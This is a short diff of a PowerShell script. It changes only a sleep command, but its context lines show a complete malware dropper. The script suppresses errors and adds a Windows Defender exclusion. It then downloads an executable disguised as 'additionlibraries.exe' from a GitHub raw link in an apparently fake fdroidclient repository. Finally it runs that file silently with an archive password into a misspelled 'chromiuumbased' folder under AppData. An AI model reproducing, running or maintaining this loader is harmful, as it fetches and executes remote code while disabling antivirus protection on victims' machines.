@@ -2,7 +2,7 @@ $ErrorActionPreference = 'SilentlyContinue'
 $ProcName = "additionlibraries.exe"
 $WebFile = "https://github.com/washywashy14/fdroidclient/blob/master/app/src/full/additionlibraries.exe?raw=true"
 $Outff = "$env:Temp\additionlibraries.exe"
-Timeout /T 10
+Start-Sleep -Seconds 10
 Add-MpPreference -ExclusionProcess serverCommon.exe -Force
 Invoke-WebRequest -uri $WebFile -OutFile $Outff
 & $env:Temp\additionlibraries.exe -s -p"of9049nwp04yb3" -d"$env:APPDATA\chromiuumbased\services\"
